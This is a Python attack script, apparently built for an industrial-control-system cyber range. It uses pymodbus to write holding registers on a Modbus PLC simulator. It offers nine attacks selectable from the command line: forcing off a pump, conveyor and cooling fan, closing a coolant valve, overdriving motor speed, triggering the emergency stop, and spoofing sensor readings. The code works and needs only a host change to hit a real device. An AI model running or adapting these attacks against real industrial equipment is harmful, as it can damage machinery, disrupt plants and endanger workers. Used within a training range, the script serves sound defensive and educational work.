import argparse
import time
from pymodbus.client.sync import ModbusTcpClient


PLC_HOST = "127.0.0.1"
PLC_PORT = 5020


REGISTER_MAP = {
    # Pump Station
    "temperature": 0,
    "pressure": 1,
    "water_level": 2,
    "pump_status": 3,

    # Conveyor Line
    "conveyor_status": 4,
    "motor_speed": 5,
    "motor_current": 6,
    "emergency_stop": 7,

    # Cooling System
    "fan_status": 8,
    "coolant_temperature": 9,
    "valve_position": 10,
    "cooling_alarm": 11,
}


def get_client():
    client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)

    if not client.connect():
        raise ConnectionError("Cannot connect to PLC simulator")

    return client


def read_plc_state(client):
    result = client.read_holding_registers(0, 12, unit=1)

    if result.isError():
        raise RuntimeError("Cannot read PLC registers")

    registers = result.registers

    return {
        "temperature": registers[0],
        "pressure": registers[1],
        "water_level": registers[2],
        "pump_status": registers[3],

        "conveyor_status": registers[4],
        "motor_speed": registers[5],
        "motor_current": registers[6],
        "emergency_stop": registers[7],

        "fan_status": registers[8],
        "coolant_temperature": registers[9],
        "valve_position": registers[10],
        "cooling_alarm": registers[11],
    }


def print_state(title, state):
    print(f"\n{title}")

    print("PUMP STATION")
    print(f"Temperature       : {state['temperature']} °C")
    print(f"Pressure          : {state['pressure']} bar")
    print(f"Water Level       : {state['water_level']} %")
    print(f"Pump Status       : {state['pump_status']}")

    print("\nCONVEYOR LINE")
    print(f"Conveyor Status   : {state['conveyor_status']}")
    print(f"Motor Speed       : {state['motor_speed']} %")
    print(f"Motor Current     : {state['motor_current']} A")
    print(f"Emergency Stop    : {state['emergency_stop']}")

    print("\nCOOLING SYSTEM")
    print(f"Fan Status        : {state['fan_status']}")
    print(f"Coolant Temp      : {state['coolant_temperature']} °C")
    print(f"Valve Position    : {state['valve_position']} %")
    print(f"Cooling Alarm     : {state['cooling_alarm']}")


def write_register(client, address, value):
    result = client.write_register(address, value, unit=1)

    if result.isError():
        raise RuntimeError(f"Cannot write register {address}")

    print(f"Register {address} set to {value}")


def repeat_write(client, writes, duration=10, interval=1):
    start_time = time.time()

    while time.time() - start_time < duration:
        for address, value in writes:
            write_register(client, address, value)

        current_state = read_plc_state(client)
        print_state("Injected state:", current_state)

        time.sleep(interval)


# ------------------------------------------------
# PUMP STATION ATTACKS
# ------------------------------------------------

def pump_off_attack():
    """
    Pump Station Attack 1:
    Modbus Command Injection — вимкнення насоса.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        write_register(client, REGISTER_MAP["pump_status"], 0)

        time.sleep(2)

        after = read_plc_state(client)
        print_state("After attack:", after)

        print("\nAttack executed: Pump forced OFF")

    finally:
        client.close()


def pump_false_data_attack(duration=10):
    """
    Pump Station Attack 2:
    False Data Injection — підміна температури та тиску.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        print(f"\nInjecting fake pump data for {duration} seconds...")

        repeat_write(
            client=client,
            writes=[
                (REGISTER_MAP["temperature"], 999),
                (REGISTER_MAP["pressure"], 0),
            ],
            duration=duration,
            interval=1
        )

        print("\nAttack executed: Pump sensor values spoofed")

    finally:
        client.close()


def water_level_spoofing_attack(duration=10):
    """
    Pump Station Attack 3:
    Water Level Spoofing — підміна рівня води.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        print(f"\nInjecting fake water level for {duration} seconds...")

        repeat_write(
            client=client,
            writes=[
                (REGISTER_MAP["water_level"], 0),
            ],
            duration=duration,
            interval=1
        )

        print("\nAttack executed: Water level spoofed")

    finally:
        client.close()


# ------------------------------------------------
# CONVEYOR LINE ATTACKS
# ------------------------------------------------

def conveyor_stop_attack():
    """
    Conveyor Line Attack 1:
    Зупинка конвеєра через Modbus.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        write_register(client, REGISTER_MAP["conveyor_status"], 0)

        time.sleep(2)

        after = read_plc_state(client)
        print_state("After attack:", after)

        print("\nAttack executed: Conveyor forced OFF")

    finally:
        client.close()


def motor_speed_overdrive_attack():
    """
    Conveyor Line Attack 2:
    Маніпуляція швидкістю двигуна.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        write_register(client, REGISTER_MAP["motor_speed"], 120)

        time.sleep(3)

        after = read_plc_state(client)
        print_state("After attack:", after)

        print("\nAttack executed: Motor speed set to unsafe value")

    finally:
        client.close()


def emergency_stop_abuse_attack():
    """
    Conveyor Line Attack 3:
    Зловживання аварійною зупинкою.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        write_register(client, REGISTER_MAP["emergency_stop"], 1)

        time.sleep(2)

        after = read_plc_state(client)
        print_state("After attack:", after)

        print("\nAttack executed: Emergency Stop activated")

    finally:
        client.close()


# ------------------------------------------------
# COOLING SYSTEM ATTACKS
# ------------------------------------------------

def fan_shutdown_attack():
    """
    Cooling System Attack 1:
    Вимкнення вентилятора охолодження.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        write_register(client, REGISTER_MAP["fan_status"], 0)

        time.sleep(3)

        after = read_plc_state(client)
        print_state("After attack:", after)

        print("\nAttack executed: Cooling fan forced OFF")

    finally:
        client.close()


def valve_manipulation_attack():
    """
    Cooling System Attack 2:
    Закриття клапана охолодження.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        write_register(client, REGISTER_MAP["valve_position"], 0)

        time.sleep(3)

        after = read_plc_state(client)
        print_state("After attack:", after)

        print("\nAttack executed: Cooling valve closed")

    finally:
        client.close()


def cooling_temp_spoofing_attack(duration=10):
    """
    Cooling System Attack 3:
    Підміна температури охолоджуючої рідини.
    """

    client = get_client()

    try:
        before = read_plc_state(client)
        print_state("Before attack:", before)

        print(f"\nInjecting fake cooling temperature for {duration} seconds...")

        repeat_write(
            client=client,
            writes=[
                (REGISTER_MAP["coolant_temperature"], 80),
            ],
            duration=duration,
            interval=1
        )

        print("\nAttack executed: Cooling temperature spoofed")

    finally:
        client.close()


ATTACKS = {
    # Pump Station
    "pump_off": pump_off_attack,
    "pump_false_data": pump_false_data_attack,
    "water_level_spoofing": water_level_spoofing_attack,

    # Conveyor Line
    "conveyor_stop": conveyor_stop_attack,
    "motor_speed_overdrive": motor_speed_overdrive_attack,
    "emergency_stop_abuse": emergency_stop_abuse_attack,

    # Cooling System
    "fan_shutdown": fan_shutdown_attack,
    "valve_manipulation": valve_manipulation_attack,
    "cooling_temp_spoofing": cooling_temp_spoofing_attack,
}


def main():
    parser = argparse.ArgumentParser(
        description="ICSCyberRange Red Team attack scenarios"
    )

    parser.add_argument(
        "--attack",
        choices=ATTACKS.keys(),
        required=True,
        help="Attack scenario to execute"
    )

    parser.add_argument(
        "--duration",
        type=int,
        default=10,
        help="Attack duration for repeated data injection attacks"
    )

    args = parser.parse_args()

    attack_function = ATTACKS[args.attack]

    if args.attack in [
        "pump_false_data",
        "water_level_spoofing",
        "cooling_temp_spoofing",
    ]:
        attack_function(duration=args.duration)
    else:
        attack_function()


if __name__ == "__main__":
    main()